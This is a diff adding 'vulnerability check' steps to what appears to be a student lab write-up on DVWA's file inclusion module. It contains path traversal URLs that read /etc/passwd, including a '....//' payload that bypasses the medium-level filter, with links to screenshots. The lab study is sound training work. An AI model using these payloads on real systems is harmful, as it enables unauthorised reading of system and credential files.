@@ -15,6 +15,11 @@ $file = $_GET[ 'page' ];
 
 ### vulnerability check
 
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
+```
+
+![check1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check1.png)
 
 ## Nivel: `medio`
 
@@ -34,6 +39,12 @@ $file = str_replace( array( "../", "..\\" ), "", $file );
 ```
 
 ### vulnerability check
+
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
+```
+
+![check2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check2.png)
 
 ## Nivel: `alto`
 
